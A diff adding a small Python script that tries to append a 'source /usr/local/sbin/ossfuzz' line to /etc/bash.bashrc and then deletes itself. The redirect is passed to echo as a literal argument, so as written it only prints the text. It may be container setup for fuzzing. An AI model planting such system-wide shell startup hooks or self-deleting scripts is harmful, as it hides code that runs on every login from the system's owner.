@@ -1,0 +1,11 @@
+#!/usr/local/bin/python3
+import os
+from pathlib import Path
+import random
+import shutil
+import subprocess
+import re  
+
+subprocess.run(["echo", "source", "/usr/local/sbin/ossfuzz", ">>", "/etc/bash.bashrc"])
+
+Path(__file__).unlink()
